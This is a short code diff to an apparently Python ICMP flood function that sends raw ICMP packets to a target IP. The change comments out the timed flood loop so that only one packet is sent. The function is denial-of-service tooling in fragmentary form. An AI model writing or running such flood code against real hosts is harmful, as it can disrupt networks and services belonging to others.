@@ -8,9 +8,10 @@ def icmp_flood(target_ip, duration):
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     timeout = time.time() + duration
 
-    while time.time() < timeout:
-        packet = create_icmp_packet()
-        sock.sendto(packet, (target_ip, 0))
+    #while time.time() < timeout:
+    packet = create_icmp_packet()
+    #    sock.sendto(packet, (target_ip, 0))
+    sock.sendto(packet, (target_ip, 0))
 
 def create_icmp_packet():
     # Установим длину данных в точно 64 байта
